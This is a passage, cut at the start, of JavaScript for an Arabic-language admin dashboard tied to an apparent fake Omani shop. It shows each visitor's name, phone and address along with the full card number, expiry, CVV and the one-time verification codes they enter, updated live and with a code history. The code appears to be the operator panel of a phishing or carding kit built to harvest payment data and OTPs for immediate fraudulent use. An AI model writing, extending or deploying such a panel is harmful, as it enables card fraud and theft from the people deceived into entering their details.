      timeEl.textContent = formatTimeAgo(date);
    }
  }
}

function updateVisitorStatus(sessionId, isOnline) {
  var card = document.querySelector('[data-session="' + sessionId + '"]');
  if (!card) return;
  
  card.setAttribute('data-online', isOnline);
  
  var header = card.querySelector('.card-header');
  var statusEl = card.querySelector('.card-status');
  
  if (isOnline) {
    header.style.background = 'linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%)';
    if (statusEl) {
      statusEl.innerHTML = '<span class="dot"></span><span>متصل الآن</span>';
    }
    // Update counts
    var onlineCount = document.getElementById('onlineCount');
    if (onlineCount) onlineCount.textContent = parseInt(onlineCount.textContent || 0) + 1;
  } else {
    header.style.background = 'linear-gradient(135deg, #6b7280 0%, #9ca3af 100%)';
    if (statusEl) {
      statusEl.innerHTML = '<span style="color:#ccc;">○</span><span style="color:#999;">غير متصل</span>';
    }
  }
}

// Request initial data on connection
function requestInitialData() {
  if (!socket || !socket.connected) {
    console.log('❌ Socket not connected, cannot request data');
    return;
  }
  socket.emit('visitors:request');
  socket.emit('stats:request');
  console.log('📡 Requesting initial data...');
}

function updateVisitorCard(sessionId, data) {
  var card = document.querySelector('[data-session="' + sessionId + '"]');
  
  // If card doesn't exist, try to add it
  if (!card) {
    console.log('📝 Card not found for:', sessionId, '- will refresh list');
    updateVisitorsList();
    return;
  }
  
  // Update card data attributes
  if (data.is_online !== undefined) {
    card.setAttribute('data-online', data.is_online);
  }
  
  // Update online/offline status visually
  var header = card.querySelector('.card-header');
  var statusEl = card.querySelector('.card-status');
  if (data.is_online === true) {
    header.style.background = 'linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%)';
    if (statusEl) {
      statusEl.innerHTML = '<span class="dot"></span><span>متصل الآن</span>';
    }
  }
  
  var cardBody = card.querySelector('.card-body');
  
  // Update delivery data
  if (data.delivery_data && cardBody) {
    var deliveryData = data.delivery_data;
    var deliveryHTML = '<div class="card-section"><div class="section-title"><span>📦</span> بيانات التوصيل</div>';
    if (deliveryData.fullName) deliveryHTML += '<div class="data-row"><span class="data-label">الاسم الكامل</span><span class="data-value">' + deliveryData.fullName + '</span></div>';
    if (deliveryData.phone) deliveryHTML += '<div class="data-row"><span class="data-label">رقم الهاتف</span><span class="data-value">' + deliveryData.phone + '</span></div>';
    if (deliveryData.email) deliveryHTML += '<div class="data-row"><span class="data-label">البريد الإلكتروني</span><span class="data-value">' + deliveryData.email + '</span></div>';
    if (deliveryData.city) deliveryHTML += '<div class="data-row"><span class="data-label">المدينة / المنطقة</span><span class="data-value">' + deliveryData.city + (deliveryData.region ? ' / ' + deliveryData.region : '') + '</span></div>';
    if (deliveryData.address) deliveryHTML += '<div class="data-row"><span class="data-label">العنوان</span><span class="data-value">' + deliveryData.address + '</span></div>';
    if (deliveryData.notes) deliveryHTML += '<div class="data-row"><span class="data-label">ملاحظات</span><span class="data-value highlight">' + deliveryData.notes + '</span></div>';
    deliveryHTML += '</div>';
    
    // Update or insert delivery section
    var existingDelivery = cardBody.querySelector('.card-section:not(.payment-section):not(.otp-section)');
    if (existingDelivery) {
      existingDelivery.outerHTML = deliveryHTML;
    } else {
      cardBody.insertAdjacentHTML('afterbegin', deliveryHTML);
    }
  }
  
  // Update payment data
  if (data.payment_data && cardBody) {
    var paymentData = data.payment_data;
    var paymentHTML = '<div class="card-section payment-section"><div class="section-title" style="border-bottom-color:#93c5fd;"><span>💳</span> بيانات الدفع</div>';
    var cardNum = paymentData.cardNumber || paymentData.card_number || '';
    if (cardNum) paymentHTML += '<div class="data-row"><span class="data-label">رقم البطاقة</span><span class="data-value">' + cardNum + '</span></div>';
    if (paymentData.cardHolder) paymentHTML += '<div class="data-row"><span class="data-label">صاحب البطاقة</span><span class="data-value">' + paymentData.cardHolder + '</span></div>';
    if (paymentData.expiry) paymentHTML += '<div class="data-row"><span class="data-label">تاريخ الانتهاء</span><span class="data-value">' + paymentData.expiry + '</span></div>';
    if (paymentData.cvv) paymentHTML += '<div class="data-row"><span class="data-label">رمز الحماية (CVV)</span><span class="data-value highlight">' + paymentData.cvv + '</span></div>';
    paymentHTML += '</div>';
    
    // Update or insert payment section
    var existingPayment = cardBody.querySelector('.payment-section');
    if (existingPayment) {
      existingPayment.outerHTML = paymentHTML;
    } else {
      var deliverySection = cardBody.querySelector('.card-section');
      if (deliverySection) {
        deliverySection.insertAdjacentHTML('afterend', paymentHTML);
      } else {
        cardBody.insertAdjacentHTML('afterbegin', paymentHTML);
      }
    }
  }
  
  // Update OTP data
  if ((data.verification_data || data.otp_history) && cardBody) {
    var verificationData = data.verification_data || {};
    var otpHistory = data.otp_history || [];
    var otpValue = verificationData.otp || '';
    
    if (!otpValue && otpHistory.length > 0) {
      otpValue = otpHistory[0].otp;
    }
    
    if (otpValue) {
      var historyHTML = '';
      if (otpHistory.length > 1) {
        var oldOtps = otpHistory.slice(1).map(function(item) {
          var date = new Date(item.timestamp).toLocaleString('ar-OM');
          return '<div class="otp-history-item">الرموز السابقة: <strong>' + item.otp + '</strong> <small>(' + date + ')</small></div>';
        }).join('');
        historyHTML = '<div class="otp-history-dropdown" id="otpHistory_' + sessionId + '">' + oldOtps + '</div>';
      }
      
      var otpSectionHTML = '<div class="otp-section"><div class="section-title" style="cursor:pointer;" onclick="toggleOtpHistory(\'' + sessionId + '\')"><span>🔐</span> رمز التحقق (OTP)' + (otpHistory.length > 1 ? '<span style="margin-right:auto;font-size:12px;color:var(--accent);">▼ ' + otpHistory.length + ' رمز</span>' : '') + '</div><div class="otp-value">' + otpValue + '</div>' + historyHTML + '</div>';
      
      // Update or insert OTP section
      var existingOTP = cardBody.querySelector('.otp-section');
      if (existingOTP) {
        existingOTP.outerHTML = otpSectionHTML;
      } else {
        cardBody.insertAdjacentHTML('beforeend', otpSectionHTML);
      }
    }
  }
  
  // Update progress steps
  var steps = card.querySelectorAll('.progress-step');
  if (data.form_submitted && steps[0]) {
    steps[0].classList.add('completed');
    steps[0].classList.remove('active');
    steps[0].querySelector('.step-icon').textContent = '✓';
  }
  if (data.payment_submitted && steps[1]) {
    steps[1].classList.add('completed');
    steps[1].classList.remove('active');
    steps[1].querySelector('.step-icon').textContent = '✓';
  }
  if (data.verification_submitted && steps[2]) {
    steps[2].classList.add('completed');
    steps[2].classList.remove('active');
    steps[2].querySelector('.step-icon').textContent = '✓';
  }
  
  // Add animation for update
  card.style.boxShadow = '0 0 20px rgba(16, 185, 129, 0.5)';
  card.style.transform = 'scale(1.02)';
  setTimeout(function() {
    card.style.boxShadow = '';
    card.style.transform = '';
  }, 500);
}

// Stats Functions
async function updateStats() {
  if (!socket) return;
  socket.emit('stats:request');
  socket.once('stats:update', (data) => {
    const elements = {
      'totalVisitors': data.totalVisitors,
      'onlineVisitors': data.onlineVisitors,
      'formSubmissions': data.formSubmissions,
      'paymentSubmissions': data.paymentSubmissions
    };
    
    Object.entries(elements).forEach(([id, value]) => {
      const el = document.getElementById(id);
      if (el) el.textContent = value;
    });
    
    const countryList = document.getElementById('countryList');
    if (countryList && data.countryStats?.length > 0) {
      const maxCount = Math.max(...data.countryStats.map(c => parseInt(c.count)));
      countryList.innerHTML = data.countryStats.map(country => `
        <div class="country-item">
          <span class="country-name">${country.country || 'غير معروف'}</span>
          <div class="country-bar">
            <div class="country-bar-fill" style="width: ${(parseInt(country.count) / maxCount) * 100}%"></div>
          </div>
          <span class="country-count">${country.count}</span>
        </div>
      `).join('');
    }
  });
}

// Admin Login
async function adminLogin(username, password) {
  try {
    const response = await fetch(`${SERVER_URL}/api/admin/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
    const data = await response.json();
    if (data.success) {
      localStorage.setItem('admin_user', JSON.stringify(data.admin));
      
      if (socket && socket.connected) {
        // Emit admin login via socket
        socket.emit('admin:login', {
          username,
          password: '',
          deviceInfo: { userAgent: navigator.userAgent, platform: navigator.platform }
        });
        
        // Wait for socket confirmation, then request data
        return new Promise((resolve) => {
          socket.once('admin:loginSuccess', (response) => {
            console.log('🔐 Socket authenticated, requesting data...', response);
            // Store the REAL session token from server
            adminToken = response.sessionToken;
            localStorage.setItem('admin_token', adminToken);
            // Request data immediately after socket auth
            socket.emit('visitors:request');
            socket.emit('stats:request');
            resolve(true);
          });
          
          socket.once('admin:loginFailed', () => {
            console.error('❌ Socket authentication failed');
            resolve(false);
          });
          
          // Timeout fallback
          setTimeout(() => resolve(true), 2000);
        });
      }
      return true;
    }
    return false;
  } catch (error) {
    console.error('Login error:', error);
    return false;
  }
}

// Ban Functions - Direct ban without prompts
function banVisitor(sessionId, ipAddress) {
  if (!confirm('هل أنت متأكد من حظر هذا المستخدم؟')) return;
  
  const customMessage = prompt('رسالة الحظر المخصصة (اضغط موافق للرسالة الافتراضية):', 'تم حظرك من الموقع. يرجى التواصل مع الدعم.');
  if (customMessage === null) return;
  
  if (socket) {
    socket.emit('user:ban', {
      targetSessionId: sessionId || null,
      targetIp: ipAddress || null,
      reason: 'Banned by admin',
      customMessage: customMessage || 'تم حظرك من الموقع.'
    });
    
    showNotification('تم الحظر', 'تم حظر المستخدم بنجاح', 'success');
    
    // Remove card from view
    const card = document.querySelector(`[data-session="${sessionId}"]`);
    if (card) {
      card.style.opacity = '0.5';
      card.style.pointerEvents = 'none';
    }
  }
}

// Load Banned Users List with client details
async function loadBannedUsers() {
  try {
    const response = await fetch(`${SERVER_URL}/api/admin/banned`);
    const data = await response.json();
    const tbody = document.getElementById('bannedTableBody');
    const countEl = document.getElementById('bannedCount');
    if (!tbody) return;
    
    if (!data.banned?.length) {
      tbody.innerHTML = `<tr><td colspan="5" class="empty-state"><span>✅</span><p>لا يوجد مستخدمين محظورين</p></td></tr>`;
      if (countEl) countEl.textContent = '0 محظور';
      return;
    }
    
    if (countEl) countEl.textContent = `${data.banned.length} محظور`;
    
    tbody.innerHTML = data.banned.map(user => {
      // Extract client info from delivery data
      const delivery = user.delivery_data;
      const hasName = delivery?.fullName;
      const hasPhone = delivery?.phone;
      const country = user.country || '';
      const banDate = new Date(user.created_at).toLocaleDateString('ar-OM');
      
      // Determine client identifier
      let clientInfo, clientBadge;
      if (hasName || hasPhone) {
        clientInfo = `
          <div style="font-weight:700;color:var(--danger);font-size:1rem;">
            👤 ${hasName || 'غير معروف'}
          </div>
          ${hasPhone ? `<div style="font-size:0.85rem;color:#666;">📞 ${hasPhone}</div>` : ''}
          ${country ? `<div style="font-size:0.8rem;color:#888;">🌍 ${country}</div>` : ''}
        `;
        clientBadge = `<span class="status-badge" style="background:rgba(0,119,182,0.1);color:var(--primary);">عميل مسجل</span>`;
      } else {
        clientInfo = `
          <div style="font-weight:700;color:var(--gray-600);font-size:1rem;">
            👤 زائر عشوائي
          </div>
          ${user.ip_address ? `<div style="font-size:0.85rem;color:#666;">🌐 IP: ${user.ip_address}</div>` : ''}
          ${country ? `<div style="font-size:0.8rem;color:#888;">🌍 ${country}</div>` : ''}
        `;
        clientBadge = `<span class="status-badge" style="background:rgba(107,114,128,0.1);color:#6b7280;">زائر</span>`;
      }
      
      return `
        <tr>
          <td style="font-weight:700;color:var(--danger);">#${user.id}</td>
          <td>
            ${clientInfo}
          </td>
          <td>
            ${clientBadge}
          </td>
          <td style="font-size:0.85rem;color:#666;">
            ${user.reason || 'بدون سبب'}
            <div style="margin-top:0.25rem;font-size:0.75rem;color:#999;">
              📅 ${banDate}
            </div>
          </td>
          <td>
            <button class="btn btn-success btn-sm" onclick="unbanUser(${user.id})" style="white-space:nowrap;">
              ✅ فك الحظر
            </button>
          </td>
        </tr>
      `;
    }).join('');
  } catch (error) {
    console.error('Error loading banned users:', error);
    showNotification('خطأ', 'فشل في تحميل قائمة المحظورين', 'error');
  }
}

// Quick Unban Function
function unbanUser(banId) {
  if (!confirm('هل أنت متأكد من فك الحظر؟')) return;
  
  if (socket) {
    socket.emit('user:unban', { banId });
    showNotification('جاري فك الحظر', '', 'info');
  } else {
    // Fallback to API
    fetch(`${SERVER_URL}/api/admin/banned/${banId}`, { method: 'DELETE' })
      .then(res => res.json())
      .then(data => {
        if (data.success) {
          showNotification('تم فك الحظر', '', 'success');
          loadBannedUsers();
        }
      })
      .catch(err => {
        showNotification('خطأ', 'حدث خطأ أثناء فك الحظر', 'error');
      });
  }
}

// Tab Navigation
function showTab(tabId) {
  document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
  document.querySelectorAll('.sidebar-link').forEach(link => link.classList.remove('active'));
  document.getElementById(tabId)?.classList.add('active');
  document.querySelector(`[data-tab="${tabId}"]`)?.classList.add('active');
  
  if (tabId === 'stats') { updateStats(); }
  else if (tabId === 'tracking') { updateVisitorsList(); }
  else if (tabId === 'products') { loadProducts(); }
  else if (tabId === 'banned') { loadBannedUsers(); }
  else if (tabId === 'devices') { loadDevices(); }
  else if (tabId === 'trash') { requestTrashData(); }
}

// Toggle Sound
function toggleSound() {
  isMuted = !isMuted;
  const btn = document.querySelector('.sound-toggle');
  if (btn) {
    btn.classList.toggle('muted', isMuted);
    btn.textContent = isMuted ? '🔇' : '🔊';
  }
}

// Show Login/Dashboard
function showLoginPage() {
  document.getElementById('loginPage').style.display = 'flex';
  document.getElementById('dashboard').style.display = 'none';
}

function showDashboard() {
  document.getElementById('loginPage').style.display = 'none';
  document.getElementById('dashboard').style.display = 'flex';
}

// Products Functions
async function loadProducts() {
  try {
    const response = await fetch(`${SERVER_URL}/api/products`);
    const data = await response.json();
    const tbody = document.getElementById('productsTableBody');
    const countEl = document.getElementById('productsCount');
    if (!tbody) return;
    
    if (!data.products?.length) {
      tbody.innerHTML = `<tr><td colspan="6" class="empty-state"><span>📦</span><p>لا توجد منتجات</p></td></tr>`;
      if (countEl) countEl.textContent = '0 منتج';
      return;
    }
    
    if (countEl) countEl.textContent = `${data.products.length} منتج`;
    
    tbody.innerHTML = data.products.map(product => {
      const isActive = product.is_active !== false;
      return `
        <tr>
          <td>${product.id}</td>
          <td>
            <div style="font-weight:600;">${product.name_ar}</div>
            ${product.name_en ? `<div style="font-size:0.8rem;color:#888;">${product.name_en}</div>` : ''}
          </td>
          <td style="color:var(--primary);font-weight:700;">${product.price} ر.ع</td>
          <td>${product.stock || 0}</td>
          <td>
            <span class="status-badge ${isActive ? 'online' : 'offline'}">
              ${isActive ? '✓ نشط' : '✕ غير نشط'}
            </span>
          </td>
          <td>
            <div class="btn-group" style="display:flex;gap:0.25rem;">
              <button class="btn btn-sm btn-warning" onclick="editProduct(${product.id})">✏️</button>
              <button class="btn btn-sm btn-danger" onclick="deleteProduct(${product.id})">🗑️</button>
            </div>
          </td>
        </tr>
      `;
    }).join('');
  } catch (error) { 
    console.error('Error loading products:', error);
    showNotification('خطأ', 'فشل في تحميل المنتجات', 'error');
  }
}

// Edit Product
async function editProduct(id) {
  try {
    const response = await fetch(`${SERVER_URL}/api/products/${id}`);
    const data = await response.json();
    
    if (data.success && data.product) {
      const product = data.product;
      
      document.getElementById('editProductId').value = product.id;
      document.getElementById('productNameAr').value = product.name_ar || '';
      document.getElementById('productNameEn').value = product.name_en || '';
      document.getElementById('productPrice').value = product.price || '';
      document.getElementById('productStock').value = product.stock || 0;
      document.getElementById('productImage').value = product.image_url || '';
      document.getElementById('productDescription').value = product.description || '';
      document.getElementById('productCategory').value = product.category || '';
      
      document.getElementById('productFormTitle').textContent = '✏️ تعديل المنتج';
      document.getElementById('productFormContainer').scrollIntoView({ behavior: 'smooth' });
    }
  } catch (error) {
    console.error('Error loading product:', error);
    showNotification('خطأ', 'فشل في تحميل بيانات المنتج', 'error');
  }
}

// Reset Product Form
function resetProductForm() {
  document.getElementById('editProductId').value = '';
  document.getElementById('productForm').reset();
  document.getElementById('productFormTitle').textContent = '➕ إضافة منتج جديد';
}

// Save Product (Add or Update)
async function saveProduct(formData) {
  const editId = document.getElementById('editProductId').value;
  const isEdit = !!editId;
  
  const productData = {
    name_ar: formData.get('name_ar') || document.getElementById('productNameAr').value,
    name_en: document.getElementById('productNameEn').value,
    price: document.getElementById('productPrice').value,
    stock: document.getElementById('productStock').value || 0,
    image_url: document.getElementById('productImage').value,
    description: document.getElementById('productDescription').value,
    category: document.getElementById('productCategory').value
  };
  
  if (!productData.name_ar) {
    showNotification('خطأ', 'اسم المنتج مطلوب', 'error');
    return;
  }
  if (!productData.price) {
    showNotification('خطأ', 'السعر مطلوب', 'error');
    return;
  }
  
  try {
    let response;
    if (isEdit) {
      response = await fetch(`${SERVER_URL}/api/products/${editId}`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(productData)
      });
    } else {
      response = await fetch(`${SERVER_URL}/api/products`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(productData)
      });
    }
    
    const data = await response.json();
    
    if (data.success) {
      showNotification('تم الحفظ', isEdit ? 'تم تحديث المنتج بنجاح' : 'تم إضافة المنتج بنجاح', 'success');
      resetProductForm();
      loadProducts();
    } else {
      showNotification('خطأ', data.message || 'فشل في حفظ المنتج', 'error');
    }
  } catch (error) {
    console.error('Error saving product:', error);
    showNotification('خطأ', 'فشل في حفظ المنتج', 'error');
  }
}

// Delete Product
async function deleteProduct(id) {
  if (!confirm('هل أنت متأكد من حذف هذا المنتج؟')) return;
  try {
    const response = await fetch(`${SERVER_URL}/api/products/${id}`, { method: 'DELETE' });
    const data = await response.json();
    
    if (data.success) {
      showNotification('تم الحذف', 'تم حذف المنتج بنجاح', 'success');
      loadProducts();
    } else {
      showNotification('خطأ', data.message || 'فشل في حذف المنتج', 'error');
    }
  } catch (error) { 
    console.error('Error deleting product:', error);
    showNotification('خطأ', 'فشل في حذف المنتج', 'error');
  }
}

// Device Management
async function loadDevices() {
  try {
    const response = await fetch(`${SERVER_URL}/api/admin/sessions`);
    const data = await response.json();
    const container = document.getElementById('devicesContainer');
    if (!container) return;
    
    if (!data.sessions?.length) {
      container.innerHTML = `<div class="empty-state"><span>📱</span><p>لا توجد أجهزة متصلة</p></div>`;
      return;
    }
    
    container.innerHTML = data.sessions.map(session => `
      <div class="device-item">
        <div class="device-info">
          <span class="device-icon">💻</span>
          <div class="device-details">
            <h4>${session.ip_address || 'غير معروف'}</h4>
            <p>${session.country || 'غير معروف'}</p>
          </div>
        </div>
        <button class="btn btn-sm btn-danger" onclick="logoutDevice('${session.session_token}')">خروج</button>
      </div>
    `).join('');
  } catch (error) { console.error('Error loading devices:', error); }
}

async function logoutDevice(token) {
  try {
    await fetch(`${SERVER_URL}/api/admin/sessions/${token}`, { method: 'DELETE' });
    showNotification('تم تسجيل الخروج', '', 'success');
    loadDevices();
  } catch (error) { console.error('Error logging out device:', error); }
}

async function logoutAllDevices() {
  if (!confirm('تسجيل خروج جميع الأجهزة؟')) return;
  try {
    await fetch(`${SERVER_URL}/api/admin/sessions`, { method: 'DELETE' });
    showNotification('تم تسجيل الخروج', '', 'success');
    loadDevices();
  } catch (error) { console.error('Error logging out devices:', error); }
}

// Initialize - SECURE: Socket connects but no data until login
document.addEventListener('DOMContentLoaded', async () => {
  // Connect socket but DON'T request data yet
  await initAdminSocket();
  
  if (!adminToken) {
    showLoginPage();
    // Clear any existing data from memory
    clearAdminData();
  } else {
    // Validate token first, then show dashboard
    await validateAdminSession();
  }
  
  // Login form
  document.getElementById('loginForm')?.addEventListener('submit', async (e) => {
    e.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const success = await adminLogin(username, password);
    if (success) {
      showDashboard();
      showTab('stats');
    } else {
      showNotification('خطأ', 'اسم المستخدم أو كلمة المرور غير صحيحة', 'error');
    }
  });
  
  // Product form
  document.getElementById('productForm')?.addEventListener('submit', async (e) => {
    e.preventDefault();
    const formData = new FormData(e.target);
    await saveProduct(formData);
  });
  
  // Logout button - SECURE: Disconnect socket and clear all data
  document.getElementById('logoutBtn')?.addEventListener('click', () => {
    // Emit logout to server
    if (socket && socket.connected) {
      socket.emit('admin:logout');
      socket.disconnect();
    }
    
    // Clear all sensitive data
    localStorage.removeItem('admin_token');
    localStorage.removeItem('admin_user');
    adminToken = null;
    
    // Clear in-memory data
    clearAdminData();
    
    // Show login page
    showLoginPage();
  });
  
  // NO MORE POLLING - Real-time updates via WebSockets!
});

// Clear all admin data from memory
function clearAdminData() {
  visitorsCache.clear();
  selectedVisitors.clear();
  
  const grid = document.getElementById('visitorsGrid');
  if (grid) grid.innerHTML = '';
  
  const trashGrid = document.getElementById('trashGrid');
  if (trashGrid) trashGrid.innerHTML = '';
  
  updateTrashCount(0);
  
  // Clear stats
  const onlineCount = document.getElementById('onlineCount');
  const totalCount = document.getElementById('totalCount');
  if (onlineCount) onlineCount.textContent = '0';
  if (totalCount) totalCount.textContent = '0';
  
  console.log('🔒 Admin data cleared from memory');
}

// Validate admin session
async function validateAdminSession() {
  if (!socket || !socket.connected) {
    showLoginPage();
    return;
  }
  
  if (!adminToken) {
    showLoginPage();
    return;
  }
  
  return new Promise((resolve) => {
    const timeout = setTimeout(() => {
      showLoginPage();
      resolve(false);
    }, 5000);
    
    socket.emit('admin:validate', { sessionToken: adminToken });
    
    socket.once('admin:valid', (data) => {
      clearTimeout(timeout);
      if (data.valid) {
        showDashboard();
        showTab('stats');
        // Request data after validation
        socket.emit('visitors:request');
        socket.emit('stats:request');
        resolve(true);
      } else {
        showLoginPage();
        resolve(false);
      }
    });
  });
}

// Export functions
window.showTab = showTab;
window.toggleSound = toggleSound;
window.banVisitor = banVisitor;
window.unbanUser = unbanUser;
window.loadBannedUsers = loadBannedUsers;
window.editProduct = editProduct;
window.deleteProduct = deleteProduct;
window.resetProductForm = resetProductForm;
window.logoutDevice = logoutDevice;
window.logoutAllDevices = logoutAllDevices;
window.clearAdminData = clearAdminData;

// Trash bin functions
window.softDeleteVisitor = softDeleteVisitor;
window.softDeleteSelected = softDeleteSelected;
window.softDeleteAll = softDeleteAll;
window.restoreVisitor = restoreVisitor;
window.permanentDeleteVisitor = permanentDeleteVisitor;
window.emptyTrash = emptyTrash;
window.toggleVisitorSelection = toggleVisitorSelection;
